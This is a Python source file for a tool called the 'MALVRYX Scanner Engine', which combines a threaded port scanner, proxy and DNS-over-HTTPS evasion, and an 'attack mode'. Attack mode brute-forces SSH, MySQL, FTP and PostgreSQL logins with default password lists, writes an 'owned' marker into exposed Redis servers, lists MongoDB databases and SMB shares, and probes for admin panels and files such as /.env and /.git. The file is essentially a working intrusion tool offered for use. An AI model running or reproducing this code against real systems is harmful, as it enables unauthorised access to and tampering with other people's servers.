#!/usr/bin/env python3
"""
MALVRYX Scanner Engine - Enhanced Attack Mode
"""
import socket, ssl, threading, time, json, requests, sys, os, ipaddress
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass
from typing import List, Dict, Optional

@dataclass
class Config:
    max_workers: int = 200
    timeout: float = 2.0
    scan_ports: List[int] = None
    sni_wordlist: List[str] = None
    dns_servers: List[str] = None
    proxies: List[str] = None
    use_doh: bool = True
    attack_mode: bool = False
    verbose: bool = False
    
    def __post_init__(self):
        if self.scan_ports is None:
            self.scan_ports = [21,22,23,25,53,80,110,111,135,139,143,443,445,465,993,995,1723,3306,3389,5432,5900,6379,8080,8443,9200,27017,5000,8000]
        if self.sni_wordlist is None:
            self.sni_wordlist = ['google.com','facebook.com','amazon.com','microsoft.com','apple.com','netflix.com','twitter.com','cloudflare.com','akamai.net','fastly.net']
        if self.dns_servers is None:
            self.dns_servers = ['https://cloudflare-dns.com/dns-query','https://dns.google/dns-query','https://dns.quad9.net/dns-query']
        if self.proxies is None:
            self.proxies = []

class ISPBypass:
    def __init__(self, config: Config):
        self.config = config
        self.session = requests.Session()
        self.proxy_pool = config.proxies.copy()
        self.current_proxy_index = 0
    
    def resolve_dns(self, hostname: str) -> List[str]:
        ips = []
        if self.config.use_doh:
            for dns_server in self.config.dns_servers:
                try:
                    response = self.session.post(dns_server, json={"name": hostname, "type": "A"},
                                                headers={"Accept": "application/dns-json"}, timeout=5)
                    if response.status_code == 200:
                        data = response.json()
                        if 'Answer' in data:
                            for answer in data['Answer']:
                                if answer['type'] == 1:
                                    ips.append(answer['data'])
                    break
                except:
                    continue
        if not ips:
            try:
                ips = [addr[4][0] for addr in socket.getaddrinfo(hostname, 80, socket.AF_INET)]
            except:
                pass
        return list(set(ips))
    
    def get_proxy(self) -> Optional[Dict]:
        if not self.proxy_pool:
            return None
        proxy = self.proxy_pool[self.current_proxy_index % len(self.proxy_pool)]
        self.current_proxy_index += 1
        return {'http': proxy, 'https': proxy} if proxy else None
    
    def create_socket(self, proxy_dict: Optional[Dict] = None):
        if proxy_dict and 'socks5' in str(proxy_dict):
            try:
                import socks
                sock = socks.socksocket()
                proxy_parts = proxy_dict['http'].replace('socks5://', '').split('@')
                if len(proxy_parts) == 2:
                    auth, host_port = proxy_parts
                    user, password = auth.split(':')
                    host, port = host_port.split(':')
                    sock.set_proxy(socks.SOCKS5, host, int(port), username=user, password=password)
                else:
                    host, port = proxy_parts[0].split(':')
                    sock.set_proxy(socks.SOCKS5, host, int(port))
                return sock
            except:
                pass
        return socket.socket(socket.AF_INET, socket.SOCK_STREAM)

class Scanner:
    def __init__(self, config: Config):
        self.config = config
        self.bypass = ISPBypass(config)
        self.results = []
        self.lock = threading.Lock()
    
    def scan_port(self, ip: str, port: int) -> Optional[Dict]:
        try:
            proxy = self.bypass.get_proxy() if self.config.proxies else None
            sock = self.bypass.create_socket(proxy)
            sock.settimeout(self.config.timeout)
            sock.connect((ip, port))
            
            service = self._get_service(port)
            banner = self._grab_banner(sock, port)
            sni = self._get_sni(sock, ip, port) if port in [443,8443,465,993,995] else None
            
            attack_result = None
            if self.config.attack_mode:
                attack_result = self._try_attack(ip, port, service)
            
            sock.close()
            
            result = {
                'ip': ip, 'port': port, 'service': service, 'banner': banner,
                'sni': sni, 'proxy_used': bool(proxy), 'vulnerable': bool(attack_result)
            }
            if attack_result:
                result['attack_results'] = attack_result
            return result
        except Exception as e:
            if self.config.verbose:
                print(f"Port {port}: {str(e)[:30]}")
            return None
    
    def _get_service(self, port: int) -> str:
        services = {21:'FTP',22:'SSH',23:'Telnet',25:'SMTP',53:'DNS',80:'HTTP',110:'POP3',
                   111:'RPC',135:'MSRPC',139:'NetBIOS',143:'IMAP',443:'HTTPS',445:'SMB',
                   465:'SMTPS',993:'IMAPS',995:'POP3S',1723:'PPTP',3306:'MySQL',3389:'RDP',
                   5432:'PostgreSQL',5900:'VNC',6379:'Redis',8080:'HTTP-Alt',8443:'HTTPS-Alt',
                   9200:'Elasticsearch',27017:'MongoDB',5000:'Flask',8000:'Web'}
        return services.get(port, 'Unknown')
    
    def _grab_banner(self, sock, port: int) -> str:
        try:
            sock.settimeout(1.5)
            if port in [21,25,110,143,993,995]:
                data = sock.recv(1024)
                return data.decode('utf-8', errors='ignore').strip()
            elif port in [80,8080,8000,5000,443,8443]:
                sock.send(b"HEAD / HTTP/1.0\r\n\r\n")
                data = sock.recv(1024)
                return data.decode('utf-8', errors='ignore').split('\r\n')[0]
        except:
            pass
        return ''
    
    def _get_sni(self, sock, ip: str, port: int) -> Optional[str]:
        try:
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            with context.wrap_socket(sock, server_hostname=ip) as ssock:
                cert = ssock.getpeercert()
                if cert and 'subjectAltName' in cert:
                    for san in cert['subjectAltName']:
                        if san[0] == 'DNS':
                            return san[1]
        except:
            pass
        return None
    
    def _try_attack(self, ip: str, port: int, service: str) -> Dict:
        attacks = {}
        
        # ===== SSH =====
        if port == 22:
            try:
                import paramiko
                users = ['root', 'admin', 'ubuntu', 'test', 'user', 'pi', 'debian', 'ftpuser']
                passwords = ['password', '123456', 'admin', 'root', 'toor', '12345', '12345678', 
                             'qwerty', 'abc123', 'password123', 'admin123', 'root123', 'pass123']
                for user in users:
                    for passwd in passwords:
                        try:
                            ssh = paramiko.SSHClient()
                            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                            ssh.connect(ip, port=22, username=user, password=passwd, timeout=3)
                            attacks['ssh'] = f"{user}:{passwd}"
                            ssh.close()
                            return attacks
                        except:
                            continue
            except:
                pass
        
        # ===== MySQL =====
        if port == 3306:
            try:
                import mysql.connector
                passwords = ['', 'root', 'password', '123456', 'admin', 'mysql', 'password123']
                for passwd in passwords:
                    try:
                        conn = mysql.connector.connect(host=ip, port=3306, user='root', password=passwd, timeout=3)
                        attacks['mysql'] = f"root:{passwd if passwd else '(empty)'}"
                        conn.close()
                        return attacks
                    except:
                        continue
            except:
                pass
        
        # ===== Redis =====
        if port == 6379:
            try:
                import redis
                r = redis.Redis(host=ip, port=6379, socket_timeout=3)
                if r.ping():
                    attacks['redis'] = 'Unauthenticated - VULNERABLE'
                    r.set('malvryx', 'owned')
                    attacks['redis_info'] = r.info()
                else:
                    for passwd in ['', 'password', '123456', 'admin', 'redis']:
                        try:
                            r = redis.Redis(host=ip, port=6379, password=passwd, socket_timeout=3)
                            if r.ping():
                                attacks['redis'] = f'Password found: {passwd}'
                                break
                        except:
                            continue
            except:
                pass
        
        # ===== FTP =====
        if port == 21:
            try:
                import ftplib
                ftp = ftplib.FTP(ip)
                ftp.login('anonymous', 'anonymous')
                attacks['ftp'] = 'Anonymous login allowed'
                ftp.quit()
            except:
                users = ['admin', 'ftp', 'user', 'test', 'anonymous']
                passwords = ['', 'password', '123456', 'admin', 'ftp', 'pass']
                for user in users:
                    for passwd in passwords:
                        try:
                            ftp = ftplib.FTP(ip)
                            ftp.login(user, passwd)
                            attacks['ftp'] = f"{user}:{passwd if passwd else '(empty)'}"
                            ftp.quit()
                            return attacks
                        except:
                            continue
            except:
                pass
        
        # ===== PostgreSQL =====
        if port == 5432:
            try:
                import psycopg2
                for passwd in ['', 'postgres', 'password', '123456']:
                    try:
                        conn = psycopg2.connect(host=ip, port=5432, user='postgres', password=passwd, connect_timeout=3)
                        attacks['postgres'] = f"postgres:{passwd if passwd else '(empty)'}"
                        conn.close()
                        return attacks
                    except:
                        continue
            except:
                pass
        
        # ===== MongoDB =====
        if port == 27017:
            try:
                from pymongo import MongoClient
                client = MongoClient(ip, 27017, serverSelectionTimeoutMS=3000)
                client.server_info()
                attacks['mongodb'] = 'Unauthenticated - VULNERABLE'
                dbs = client.list_database_names()
                attacks['mongodb_dbs'] = dbs[:5]
            except:
                pass
        
        # ===== Elasticsearch =====
        if port == 9200:
            try:
                import requests
                resp = requests.get(f"http://{ip}:9200/", timeout=3)
                if resp.status_code == 200:
                    attacks['elasticsearch'] = 'Open - Data accessible'
                    if 'version' in resp.text:
                        attacks['elasticsearch_version'] = resp.text[:200]
            except:
                pass
        
        # ===== HTTP/HTTPS =====
        if port in [80, 443, 8080, 8443]:
            try:
                import requests
                protocol = 'https' if port in [443, 8443] else 'http'
                url = f"{protocol}://{ip}:{port}"
                
                paths = ['/admin', '/login', '/wp-admin', '/cpanel', '/phpmyadmin', '/dashboard',
                         '/administrator', '/user', '/console', '/api', '/v1', '/dev', '/test',
                         '/backup', '/config', '/.git', '/.env', '/.htaccess', '/wp-login.php',
                         '/admin/login', '/adminpanel', '/cp', '/control', '/management']
                
                found_paths = []
                for path in paths:
                    try:
                        resp = requests.get(f"{url}{path}", timeout=3, verify=False)
                        if resp.status_code in [200, 301, 302, 403]:
                            found_paths.append(path)
                    except:
                        continue
                
                if found_paths:
                    attacks['web'] = f"Paths found: {', '.join(found_paths[:5])}"
                
                for path in ['/images', '/uploads', '/files', '/documents', '/data']:
                    try:
                        resp = requests.get(f"{url}{path}", timeout=3, verify=False)
                        if 'Index of' in resp.text or 'Directory listing' in resp.text:
                            attacks['web_dir_listing'] = f"Directory listing: {path}"
                            break
                    except:
                        continue
            except:
                pass
        
        # ===== SMB =====
        if port == 445:
            try:
                import smbclient
                try:
                    shares = smbclient.list_shares(ip, username='guest', password='')
                    if shares:
                        attacks['smb'] = f"Shares: {shares}"
                except:
                    pass
            except:
                pass
        
        # ===== RDP =====
        if port == 3389:
            try:
                import socket
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(3)
                sock.connect((ip, 3389))
                banner = sock.recv(1024)
                attacks['rdp'] = f"RDP Banner: {banner[:50].decode('utf-8', errors='ignore')}"
                sock.close()
            except:
                pass
        
        return attacks
    
    def scan(self, target: str) -> List[Dict]:
        if not self._is_ip(target):
            resolved = self.bypass.resolve_dns(target)
            if resolved:
                target = resolved[0]
                print(f"✅ Resolved to: {target}")
            else:
                print(f"❌ Failed to resolve")
                return []
        
        print(f"\n🔍 Scanning {target} ({len(self.config.scan_ports)} ports)...")
        
        with ThreadPoolExecutor(max_workers=self.config.max_workers) as executor:
            futures = {executor.submit(self.scan_port, target, port): port for port in self.config.scan_ports}
            for future in as_completed(futures):
                result = future.result()
                if result:
                    self.results.append(result)
                    self._print_result(result)
                    time.sleep(0.01)
        
        return self.results
    
    def _is_ip(self, host: str) -> bool:
        try:
            socket.inet_aton(host)
            return True
        except:
            return False
    
    def _print_result(self, result: Dict):
        status = "✓" if result['port'] else "✗"
        vuln = " 💀" if result.get('vulnerable') else ""
        ssl_tag = "🔒" if result['port'] in [443,8443,465,993,995] else ""
        sni_tag = f" (SNI:{result.get('sni','N/A')})" if result.get('sni') else ""
        
        print(f"{status} {result['ip']}:{result['port']} [{result['service']}] {ssl_tag}{sni_tag}{vuln}")
        if result.get('banner'):
            print(f"  📝 {result['banner'][:80]}")
        if result.get('attack_results'):
            print(f"  ⚡ {result['attack_results']}")
